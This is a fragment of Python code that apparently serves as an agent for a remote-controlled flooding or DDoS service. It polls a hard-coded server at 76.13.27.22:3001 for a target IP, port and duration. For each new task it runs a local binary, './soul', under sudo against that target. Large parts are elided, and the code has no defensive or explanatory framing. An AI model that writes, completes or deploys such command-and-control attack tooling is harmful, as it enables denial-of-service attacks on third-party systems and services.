...
BASE_URL = 'http://76.13.27.22:3001'
SOUL_PATH = '/crewaptinggsbysoulcrackkk/'
DONE_PATH = '/crewaptinggsbysoulcrackkk/done'
    ...
    if ip and port and time_val:
        ...
        if key not in active_tasks:
            ...
            try:
                ...
                process = subprocess.Popen(['sudo', './soul', ip, str(port), str(time_val),'999'])
